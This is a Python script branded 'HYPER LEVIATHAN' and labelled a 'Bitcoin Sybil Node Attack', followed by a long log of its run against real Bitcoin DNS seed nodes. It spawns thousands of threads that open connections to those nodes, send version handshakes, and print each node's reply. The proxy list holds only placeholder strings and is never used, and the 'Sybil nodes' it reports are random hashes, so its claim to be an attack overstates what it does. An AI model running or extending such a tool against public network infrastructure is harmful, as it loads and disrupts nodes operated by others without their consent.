# %%
import socket
import struct
import hashlib
import time
import random
import concurrent.futures

# Bitcoin seed nodes
SEED_NODES = [
    'seed.bitcoin.sipa.be',
    'dnsseed.bluematt.me',
    'dnsseed.bitcoin.dashjr.org',
    'seed.bitcoinstats.com',
    'seed.bitcoin.jonasschnelli.ch',
    'seed.btc.petertodd.org',
]


def double_sha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def create_message(command, payload):
    """Creates a Bitcoin protocol message"""
    magic = 0xD9B4BEF9
    command_bytes = command.encode('ascii').ljust(12, b'\x00')
    payload_len = len(payload)
    checksum = double_sha256(payload)[:4]

    return struct.pack('<I12sI4s', magic, command_bytes, payload_len, checksum) + payload


def read_varint(data, offset):
    """Reads a varint and returns (value, size_in_bytes)"""
    first_byte = data[offset]
    if first_byte < 0xfd:
        return first_byte, 1
    elif first_byte == 0xfd:
        return struct.unpack('<H', data[offset+1:offset+3])[0], 3
    elif first_byte == 0xfe:
        return struct.unpack('<I', data[offset+1:offset+5])[0], 5
    else:
        return struct.unpack('<Q', data[offset+1:offset+9])[0], 9


def create_version_payload():
    """Creates the version payload for Bitcoin protocol handshake"""
    version = 70015
    services = 1
    timestamp = int(time.time())

    addr_recv_services = 1
    addr_recv_ip = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton('127.0.0.1')
    addr_recv_port = 8333
    addr_recv = struct.pack('<Q16sH', addr_recv_services, addr_recv_ip, addr_recv_port)

    addr_from_services = 1
    addr_from_ip = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton('127.0.0.1')
    addr_from_port = 8333
    addr_from = struct.pack('<Q16sH', addr_from_services, addr_from_ip, addr_from_port)

    nonce = random.getrandbits(64)
    user_agent_bytes = b'/SybilNode:0.1.0/'
    user_agent_len = len(user_agent_bytes)

    if user_agent_len < 0xfd:
        var_int_user_agent_len = struct.pack('<B', user_agent_len)
    elif user_agent_len <= 0xffff:
        var_int_user_agent_len = struct.pack('<BH', 0xfd, user_agent_len)
    elif user_agent_len <= 0xffffffff:
        var_int_user_agent_len = struct.pack('<BI', 0xfe, user_agent_len)
    else:
        var_int_user_agent_len = struct.pack('<BQ', 0xff, user_agent_len)

    start_height = 0
    relay = True

    payload = struct.pack('<iQq', version, services, timestamp) + \
              addr_recv + \
              addr_from + \
              struct.pack('<Q', nonce) + \
              var_int_user_agent_len + \
              user_agent_bytes + \
              struct.pack('<i?', start_height, relay)
    return payload


def parse_version(payload):
    """Parses the version message payload from a Bitcoin node"""
    offset = 0
    parsed_data = {}
    try:
        if len(payload) < offset + 4:
            raise ValueError("Payload too short for 'version' field.")
        parsed_data['version'] = struct.unpack('<i', payload[offset:offset+4])[0]
        offset += 4

        if len(payload) < offset + 8:
            raise ValueError("Payload too short for 'services' field.")
        parsed_data['services'] = struct.unpack('<Q', payload[offset:offset+8])[0]
        offset += 8

        if len(payload) < offset + 8:
            raise ValueError("Payload too short for 'timestamp' field.")
        parsed_data['timestamp'] = struct.unpack('<q', payload[offset:offset+8])[0]
        offset += 8

        if len(payload) < offset + 26:
            raise ValueError("Payload too short for 'addr_recv' field.")
        offset += 26

        if len(payload) < offset + 26:
            raise ValueError("Payload too short for 'addr_from' field.")
        offset += 26

        if len(payload) < offset + 8:
            raise ValueError("Payload too short for 'nonce' field.")
        parsed_data['nonce'] = struct.unpack('<Q', payload[offset:offset+8])[0]
        offset += 8

        if len(payload) < offset + 1:
            raise ValueError("Payload too short for 'user_agent_len' varint.")
        user_agent_len, varint_size = read_varint(payload, offset)
        offset += varint_size

        if len(payload) < offset + user_agent_len:
            raise ValueError("Payload too short for 'user_agent' string.")
        parsed_data['user_agent'] = payload[offset:offset+user_agent_len].decode('utf-8', errors='ignore')
        offset += user_agent_len

        if len(payload) < offset + 4:
            raise ValueError("Payload too short for 'start_height' field.")
        parsed_data['start_height'] = struct.unpack('<i', payload[offset:offset+4])[0]
        offset += 4

        if len(payload) >= offset + 1:
            parsed_data['relay'] = struct.unpack('?', payload[offset:offset+1])[0]
            offset += 1
        else:
            parsed_data['relay'] = True

    except (struct.error, ValueError) as e:
        print(f"DEBUG: Error parsing version payload. Error: {e}")
        return None

    return parsed_data


def read_full_message(sock):
    """Reads a full Bitcoin message from the socket"""
    header = b''
    while len(header) < 24:
        chunk = sock.recv(24 - len(header))
        if not chunk:
            raise EOFError("Socket closed prematurely while reading header")
        header += chunk

    magic, command_bytes, length, checksum_expected = struct.unpack('<I12sI4s', header)
    command = command_bytes.decode('ascii').rstrip('\x00')

    payload = b''
    while len(payload) < length:
        chunk = sock.recv(min(4096, length - len(payload)))
        if not chunk:
            raise EOFError("Socket closed prematurely while reading payload")
        payload += chunk

    checksum_calculated = double_sha256(payload)[:4]
    if checksum_calculated != checksum_expected:
        print(f"Warning: Checksum mismatch for command '{command}'")

    return command, payload, magic, checksum_expected


def generate_proxies(num_workers):
    """Generates a list of proxies based on the number of workers"""
    proxies = []
    for i in range(1, num_workers + 1):
        proxies.append(f'http://proxy{i}:port')
    return proxies


def create_sybil_node(proxy, worker_id):
    """Creates a Sybil node and connects to a random seed node"""
    seed_node = random.choice(SEED_NODES)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((seed_node, 8333))
        version_payload = create_version_payload()
        version_msg = create_message('version', version_payload)
        sock.sendall(version_msg)

        command, payload, magic, checksum = read_full_message(sock)
        print(f"[Worker {worker_id}] Received '{command}' from {seed_node} ({len(payload)} bytes)")

        if command == 'version':
            version_info = parse_version(payload)
            if version_info:
                print(f"[Worker {worker_id}] Version: {version_info['version']} | User-Agent: {version_info['user_agent']} | Height: {version_info['start_height']}")
            else:
                print(f"[Worker {worker_id}] Failed to parse version info from {seed_node}")
        elif command == 'verack':
            print(f"[Worker {worker_id}] Received verack from {seed_node}")
        else:
            print(f"[Worker {worker_id}] Received unexpected command: {command}")

    except socket.timeout:
        print(f"[Worker {worker_id}] Timeout connecting to {seed_node}")
        return None
    except EOFError as e:
        print(f"[Worker {worker_id}] Connection closed: {e}")
        return None
    except Exception as e:
        print(f"[Worker {worker_id}] Error: {e}")
        return None
    finally:
        sock.close()

    new_address = hashlib.sha256(f"{time.time()}-{worker_id}".encode()).hexdigest()
    return {'address': new_address, 'proxy': proxy, 'worker_id': worker_id}


def connect_sybil_nodes(sybil_nodes):
    """Connects all created Sybil nodes to the network"""
    for node in sybil_nodes:
        seed_node = random.choice(SEED_NODES)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        try:
            sock.connect((seed_node, 8333))
            version_payload = create_version_payload()
            version_msg = create_message('version', version_payload)
            sock.sendall(version_msg)

            command, payload, magic, checksum = read_full_message(sock)
            print(f"[Node {node['worker_id']}] Received '{command}' from {seed_node} ({len(payload)} bytes)")

            if command == 'version':
                version_info = parse_version(payload)
                if version_info:
                    print(f"[Node {node['worker_id']}] Version: {version_info['version']} | User-Agent: {version_info['user_agent']} | Height: {version_info['start_height']}")
                else:
                    print(f"[Node {node['worker_id']}] Failed to parse version info")
            elif command == 'verack':
                print(f"[Node {node['worker_id']}] Received verack from {seed_node}")

        except socket.timeout:
            print(f"[Node {node['worker_id']}] Timeout connecting to {seed_node}")
            continue
        except EOFError as e:
            print(f"[Node {node['worker_id']}] Connection closed: {e}")
            continue
        except Exception as e:
            print(f"[Node {node['worker_id']}] Error: {e}")
            continue
        finally:
            sock.close()


def print_banner():
    """Displays the HYPER LEVIATHAN banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                        ║
    ║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                       ║
    ║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                       ║
    ║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                       ║
    ║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                       ║
    ║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                       ║
    ║                                                                   ║
    ║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗ ║
    ║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║ ║
    ║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║ ║
    ║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║ ║
    ║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║ ║
    ║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
    ║                                                                   ║
    ║                    Bitcoin Sybil Node Attack                      ║
    ║                         Version 1.0.0                             ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def hyper_leviathan_attack(num_workers):
    """Main function to execute the Hyper Leviathan attack"""

    # Generate proxies based on the number of workers
    proxies = generate_proxies(num_workers)

    print(f"\n[*] Starting HYPER LEVIATHAN with {num_workers} workers...")
    print(f"[*] Proxies generated: {len(proxies)}")
    print(f"[*] Available seed nodes: {len(SEED_NODES)}")
    print("-" * 60)

    sybil_nodes = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # Create tasks for each worker with its corresponding proxy
        future_to_worker = {}
        for i, proxy in enumerate(proxies, 1):
            future = executor.submit(create_sybil_node, proxy, i)
            future_to_worker[future] = (proxy, i)

        for future in concurrent.futures.as_completed(future_to_worker):
            proxy, worker_id = future_to_worker[future]
            try:
                data = future.result()
                if data:
                    sybil_nodes.append(data)
                    print(f"[+] Sybil node created by Worker {worker_id}: {data['address'][:32]}...")
            except Exception as exc:
                print(f"[-] Worker {worker_id} exception: {exc}")

    print("-" * 60)

    if sybil_nodes:
        print(f"\n[*] Connecting {len(sybil_nodes)} Sybil nodes to the network...\n")
        connect_sybil_nodes(sybil_nodes)
        print("-" * 60)
        print(f"\n[+] HYPER LEVIATHAN completed!")
        print(f"[+] Total Sybil nodes created: {len(sybil_nodes)}")
    else:
        print("\n[-] No Sybil nodes were created successfully.")


def main():
    """Main function with user input"""
    print_banner()

    while True:
        try:
            user_input = input("\n[?] How many HYPER LEVIATHAN workers do you want? > ")
            num_workers = int(user_input)

            if num_workers <= 0:
                print("[!] Number of workers must be greater than 0.")
                continue

            if num_workers > 1000:
                confirm = input(f"[!] Are you sure you want to use {num_workers} workers? (y/n) > ")
                if confirm.lower() != 'y':
                    continue

            print(f"\n[*] Configuration:")
            print(f"    - Workers: {num_workers}")
            print(f"    - Proxies: {num_workers}")
            print(f"    - Seed Nodes: {len(SEED_NODES)}")

            confirm = input("\n[?] Start attack? (y/n) > ")
            if confirm.lower() == 'y':
                hyper_leviathan_attack(num_workers)
                break
            else:
                print("[*] Attack cancelled.")
                continue

        except ValueError:
            print("[!] Please enter a valid number.")
            continue
        except KeyboardInterrupt:
            print("\n\n[*] HYPER LEVIATHAN cancelled by user.")
            break


if __name__ == "__main__":
    main()
# Out:
# Se han truncado las últimas 5000 líneas del flujo de salida.
# [Worker 496] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 496] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2946] Connection closed: Socket closed prematurely while reading header
# [Worker 2949] Connection closed: Socket closed prematurely while reading header
# [Worker 2941] Connection closed: Socket closed prematurely while reading header
# [Worker 2945] Connection closed: Socket closed prematurely while reading header
# [Worker 1145] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1145] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2954] Connection closed: Socket closed prematurely while reading header
# [Worker 2952] Connection closed: Socket closed prematurely while reading header
# [Worker 2302] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2302] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1607] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1607] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1857] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1857] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2973] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 2973] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2273] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2273] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 214] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 214] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2034] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2034] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1783] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1783] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1206] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1206] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2066] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2066] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2969] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 2969] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2960] Connection closed: Socket closed prematurely while reading header
# [Worker 173] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 173] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1240] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1240] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2971] Connection closed: Socket closed prematurely while reading header
# [Worker 2963] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 2963] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2975] Connection closed: Socket closed prematurely while reading header
# [Worker 1630] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1630] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2985] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 2985] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2970] Connection closed: Socket closed prematurely while reading header
# [Worker 2998] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 2998] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2980] Connection closed: Socket closed prematurely while reading header
# [Worker 2983] Connection closed: Socket closed prematurely while reading header
# [Worker 2966] Connection closed: Socket closed prematurely while reading header
# [Worker 2984] Connection closed: Socket closed prematurely while reading header
# [Worker 2986] Connection closed: Socket closed prematurely while reading header
# [Worker 1968] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1968] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2042] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2042] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1555] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1555] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3004] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3004] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1248] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1248] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 74] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 74] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1746] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1746] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3009] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3009] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1599] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1599] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3001] Connection closed: Socket closed prematurely while reading header
# [Worker 3014] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3014] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1649] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1649] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1950] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1950] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3007] Connection closed: Socket closed prematurely while reading header
# [Worker 3016] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3016] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1602] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1602] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3011] Connection closed: Socket closed prematurely while reading header
# [Worker 2137] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2137] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3013] Connection closed: Socket closed prematurely while reading header
# [Worker 561] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 561] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3019] Connection closed: Socket closed prematurely while reading header
# [Worker 2035] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2035] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3039] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3039] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3023] Connection closed: Socket closed prematurely while reading header
# [Worker 3022] Connection closed: Socket closed prematurely while reading header
# [Worker 1796] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1796] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3028] Connection closed: Socket closed prematurely while reading header
# [Worker 2079] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2079] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 223] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 223] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1716] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1716] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3040] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3040] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3030] Connection closed: Socket closed prematurely while reading header
# [Worker 3026] Connection closed: Socket closed prematurely while reading header
# [Worker 3032] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3032] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1614] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1614] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1956] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1956] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3029] Connection closed: Socket closed prematurely while reading header
# [Worker 2461] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2461] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2083] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2083] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 323] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 323] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3035] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3035] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2313] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2313] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3060] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3060] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3062] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3062] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1419] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1419] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3053] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 3053] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930223
# [Worker 3052] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 3052] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930223
# [Worker 3058] Connection closed: Socket closed prematurely while reading header
# [Worker 3059] Connection closed: Socket closed prematurely while reading header
# [Worker 3055] Connection closed: Socket closed prematurely while reading header
# [Worker 2171] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2171] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2249] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2249] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2196] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2196] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3064] Connection closed: Socket closed prematurely while reading header
# [Worker 2002] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2002] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1122] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1122] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3071] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3071] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1262] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1262] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3070] Connection closed: Socket closed prematurely while reading header
# [Worker 571] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 571] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3080] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3080] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3085] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3085] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1317] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1317] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1619] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1619] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2291] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2291] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1764] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1764] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3082] Connection closed: Socket closed prematurely while reading header
# [Worker 3088] Connection closed: Socket closed prematurely while reading header
# [Worker 2160] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2160] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3098] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3098] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1695] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1695] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1667] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1667] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3097] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3097] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2211] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2211] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1819] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1819] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3093] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3093] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2471] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2471] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 834] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 834] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1638] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1638] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3112] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3112] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 900] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 900] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1583] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1583] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1797] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1797] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1986] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1986] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 105] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 105] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 59] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 59] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2405] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2405] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1601] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1601] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2824] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2824] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3118] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3118] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1814] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1814] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3126] Received 'version' from dnsseed.bluematt.me (102 bytes)
